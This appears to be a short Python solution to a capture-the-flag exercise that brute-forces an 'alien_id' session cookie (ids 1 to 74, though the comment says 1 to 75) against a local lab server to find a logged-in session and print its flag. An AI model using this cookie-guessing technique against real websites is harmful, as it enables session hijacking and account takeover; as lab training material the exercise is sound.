#
# Write a script that can guess cookie values
# and send them to the url http://127.0.0.1:8082/cookiestore
# Read the response from the logged in cookie value to get the flag.
# The cookie name the aliens are using is alien_id
# we believe the id is a number between 1 and 75
#
# Note: The script can timeout. If this occurs try narrowing
# down your search
#
from urllib import request

for i in range(1,75):

  # Specifies URL and opens it
  r = request.Request("http://127.0.0.1:8082/cookiestore", headers={"Cookie":"alien_id="+str(i)})
  resp = request.urlopen(r)

  # Reads the response and prints to console
  html = resp.read()
  print(html)
